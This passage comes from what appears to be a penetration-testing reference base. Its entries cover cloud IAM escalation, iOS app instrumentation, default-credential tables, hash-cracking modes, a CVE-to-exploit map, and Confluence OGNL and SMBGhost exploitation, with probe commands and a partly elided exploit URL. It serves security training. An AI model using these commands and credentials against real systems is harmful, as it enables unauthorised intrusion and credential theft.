- **ssm:SendCommand** on an EC2 instance -> run commands on it. (See: aws-enumeration.)

## Azure / Entra
- **A role with Microsoft.Authorization/roleAssignments/write** (Owner/User Access Admin) -> grant
  yourself any role.
- **Managed identity** on a VM/function -> grab its token (IMDS) and use its roles.
- **Add credentials to a service principal / app** you can manage -> auth as it.
- **Reset a user's password** / dynamic group abuse. (See: azure-entra-basics.)

## GCP
- **iam.serviceAccountTokenCreator / actAs** -> impersonate a better service account.
- **setIamPolicy** on a resource -> grant yourself roles.
- **deploymentmanager / cloudfunctions deploy** running as a privileged SA. (See: gcp-enumeration.)

## Pattern
"Enumerate IAM perms -> look for PassRole/AssumeRole/impersonation, policy-write, or compute-deploy
as a privileged identity -> escalate. Pacu/ScoutSuite surface these." (See: aws-enumeration,
azure-entra-basics, gcp-enumeration.)

entries.title: iOS app testing basics
entries.brief: Where to start on an iOS app: the IPA, keychain, and dynamic instrumentation
entries.body:
## The landscape (vs Android)
iOS apps ship as **.ipa** (a zip of a signed app bundle). Static analysis is harder than Android's
decompile-to-Java, so dynamic instrumentation (Frida/Objection) carries more weight. A jailbroken
device or a re-signed app is usually needed for full testing.

## Static
- `unzip app.ipa` -> Payload/App.app; read **Info.plist** (URL schemes, ATS exceptions, perms).
- The main binary is a **Mach-O** (often encrypted on-device); strings/class-dump for symbols.
- Hunt hardcoded secrets, endpoints, and keys in the bundle and embedded frameworks.

## Dynamic (jailbroken / re-signed)
    frida-ps -Uai ; frida -U -f com.app -l hook.js        # instrument (oscp atlas frida)
    objection -g com.app explore                          # SSL unpin, keychain dump, class/method listing
    objection ... 'ios keychain dump'                     # secrets stored in the Keychain
    objection ... 'ios sslpinning disable'                # then intercept HTTPS in Burp

## What to test
- **Transport**: SSL pinning (bypass with objection/frida), ATS exceptions in Info.plist.
- **Storage**: Keychain, NSUserDefaults/plists, Core Data, cached files for sensitive data.
- **The API**: once intercepted, it's the real attack surface (api-security-testing).
- **Local auth / jailbreak detection** bypass with frida hooks.

## Pattern
"unzip the IPA -> read Info.plist + strings for secrets -> jailbroken device + objection/frida to
unpin SSL and dump the Keychain -> attack the API." (See: mobile-apk-basics, api-security-testing,
thick-client-basics.)

entries.title: Default credentials — try these first
entries.brief: A service -> default login lookup; always test before brute-forcing
entries.body:
## Always try defaults first
Before any brute force, try each service's well-known defaults, plus **username-as-password**, a
**blank** password, and every credential you've already found (credential-reuse-strategy).

| Service / app | Common defaults |
| --- | --- |
| Tomcat manager | tomcat/tomcat, admin/admin, tomcat/s3cret |
| Jenkins | admin/admin (or the setup token) |
| MySQL / MariaDB | root/(blank), root/root |
| PostgreSQL | postgres/postgres |
| MSSQL | sa/(blank), sa/sa |
| Oracle | scott/tiger, system/manager, sys/change_on_install |
| MongoDB / Redis / memcached | (often no auth) |
| phpMyAdmin | root/(blank) |
| WordPress / Grafana / Jira | admin/admin |
| RabbitMQ | guest/guest |
| Elasticsearch / Kibana | elastic/changeme |
| SNMP | public (ro), private (rw) |
| FTP | anonymous/anonymous |
| Routers / IoT / printers | admin/admin, admin/password, root/root, admin/(blank) |
| pfSense | admin/pfsense |
| Webmin | root/(system password) |
| VNC | (often none) |

## Automate the check
    nmap --script '*-default-accounts,http-default-accounts' -p<ports> TARGET
    nxc <proto> TARGET -u admin -p admin        # quick AD/service default check
    hydra -C /usr/share/seclists/Passwords/Default-Credentials/<list>.txt <proto>://TARGET
`changeme` and the seclists Default-Credentials lists cover hundreds more.

## Pattern
"Default creds + username=password + blank + found creds -> try before brute force." (See:
credential-reuse-strategy, tool-selection, attack-* service plans.)

entries.title: Hash -> crack mode reference (hashcat / john)
entries.brief: Identify a hash, then grab the right hashcat -m and john --format
entries.body:
## Identify first, then crack
Run `hashid '<hash>'` or `name-that-hash -t '<hash>'`, then use this table. (Strategy:
cracking-rules-and-masks.)

| Hash / source | hashcat -m | john --format |
| --- | --- | --- |
| MD5 | 0 | raw-md5 |
| SHA1 | 100 | raw-sha1 |
| SHA-256 | 1400 | raw-sha256 |
| MySQL (newer) | 300 | mysql-sha1 |
| NTLM (SAM/NTDS) | 1000 | NT |
| NetNTLMv2 (Responder) | 5600 | netntlmv2 |
| Kerberoast TGS | 13100 | krb5tgs |
| AS-REP | 18200 | krb5asrep |
| DCC2 / MSCache2 | 2100 | mscash2 |
| Linux md5crypt $1$ | 500 | md5crypt |
| Linux sha512crypt $6$ | 1800 | sha512crypt |
| bcrypt $2a$/$2b$ | 3200 | bcrypt |
| WordPress phpass $P$/$H$ | 400 | phpass |
| Drupal 7 $S$ | 7900 | drupal7 |
| KeePass .kdbx | 13400 | keepass |
| WPA/WPA2 (hc22000) | 22000 | wpapsk |
| PDF | 10500/10600/10700 | PDF |
| SSH key | 22921 | ssh |

## Note
DCC2 and NetNTLMv2 **cannot be passed** — crack only. NTLM can be passed (PtH). File/key hashes
come from the *2john pre-parsers (ssh2john, keepass2john, etc.).

## Pattern
"hashid -> look up -m / --format -> crack (wordlist+rules first)." (See: cracking-rules-and-masks,
password-cracking-workflow, hashes-and-formats.)

entries.title: Common web-app CVEs (version -> exploit map)
entries.brief: Fingerprint the app/version, then jump to the known exploit
entries.body:
## Use it
After fingerprinting (whatweb / version string), match the product to a known high-impact bug.
Confirm with `searchsploit --cve <id>` or `nuclei`. Each links its detailed entry.

| App / product | Notable CVE | Effect -> entry |
| --- | --- | --- |
| Apache httpd 2.4.49/50 | 2021-41773 / 42013 | path traversal -> RCE |
| Log4j | 2021-44228 | JNDI RCE -> log4shell-jndi |
| Spring (binding) | 2022-22965 | Spring4Shell RCE -> java-web-rce |
| Spring Cloud Gateway | 2022-22947 | SpEL RCE -> spring-boot-actuator |
| Atlassian Confluence | 2022-26134 | OGNL RCE -> confluence-ognl-rce |
| GitLab (ExifTool) | 2021-22205 | unauth RCE -> gitlab-exploitation |
| Apache Tomcat (AJP) | 2020-1938 | GhostCat file read/RCE -> ajp-ghostcat |
| Drupal | 2018-7600 | Drupalgeddon2 RCE -> cms-exploitation |
| vsftpd 2.3.4 | backdoor | root shell -> attack-ftp |
| Samba usermap | 2007-2447 | RCE -> samba-exploits |
| MS Exchange | ProxyShell/ProxyLogon | RCE -> proxyshell-proxylogon |
| Windows Print Spooler | 2021-34527 | PrintNightmare -> printnightmare-spooler |
| OpenSSL | 2014-0160 | Heartbleed memory leak |
| bash/CGI | 2014-6271 | Shellshock RCE -> shellshock |
| Jenkins / WordPress | plugin/version | -> jenkins-exploitation / attack-wordpress |

## Pattern
"whatweb -> exact version -> match this table -> searchsploit --cve / nuclei -> read before run."
(See: searchsploit, nuclei, web-methodology.)

entries.title: Atlassian Confluence OGNL RCE (CVE-2022-26134)
entries.brief: Unauthenticated OGNL injection in Confluence, and the Atlassian pattern
entries.body:
## The bug
Confluence Server/Data Center (pre-7.18.1) evaluated **OGNL** expressions placed in the URL path,
giving **unauthenticated RCE** as the Confluence service account. A headline 2022 exploit; still
appears on unpatched boxes.

## Confirm (safe probe)
    curl -s 'http://TARGET:8090/%24%7B(%23a%3D1%2B1)%7D/'   # look for math/behaviour, or OOB
The injectable spot is the **URI**: a `${...}` OGNL expression in the path.

## Exploit (authorised only)
    # OGNL that runs a command and returns output in a response header:
    curl -s 'http://TARGET:8090/%24%7B(%23a%3D@org.apache.commons.io.IOUtils@toString(...id...))%7D/' -i
Public PoCs automate building the URL-encoded OGNL and reading the X-Cmd-Response header. Then drop
a reverse shell (oscp hacktools revshell).

## The Atlassian theme
Confluence/Jira have a history of **OGNL / template injection** (and SSRF). Fingerprint the version
(/login footer, /status) and map to the CVE. Related OGNL: Struts (java-web-rce).

## Pattern
"Confluence version pre-patch -> OGNL in the URI path -> confirm with math/OOB -> command via
OGNL -> reverse shell." (See: java-web-rce, ssti-logic, common-webapp-cves.)

entries.title: SMBGhost (CVE-2020-0796)
entries.brief: The SMBv3.1.1 compression flaw — LPE and potential RCE on unpatched Windows 10/Server
entries.body:
## The flaw
A buffer overflow in **SMBv3.1.1 compression** (SMB 3.1.1 on Windows 10 1903/1909 and Server 2004
era) allows **local privilege escalation to SYSTEM** reliably, and **remote code execution** with
a less reliable public exploit. Think 'EternalBlue-era' bug for newer Windows.

## Detect
    nmap -p445 --script smb-protocols TARGET            # SMB 3.1.1 present?
    # dedicated scanner PoC checks the compression capability bit
Confirm the exact build (systeminfo) is in the vulnerable range.

## Use
- **LPE (reliable)**: run the local SMBGhost LPE PoC from an unprivileged shell -> SYSTEM.
- **RCE (fragile)**: the remote PoC can crash the target (BSOD) — know the risk before firing on
  an exam/lab box; have a revert ready.
Match the PoC to the exact build; `searchsploit smbghost` / the public PoCs.

## Pattern
"SMB 3.1.1 on a vulnerable build -> SMBGhost LPE for SYSTEM (reliable) or RCE (crashy)." (See:
eternalblue-ms17010, kernel-exploits, windows-privesc-checklist.)

entries.title: AD quick wins — the fastest paths first
entries.brief: The low-effort, high-yield AD checks to run before anything complex
entries.body:
## Try these before the hard stuff
AD compromises often fall to a handful of cheap checks. Run them early.

| Quick win | How | Needs |
| --- | --- | --- |
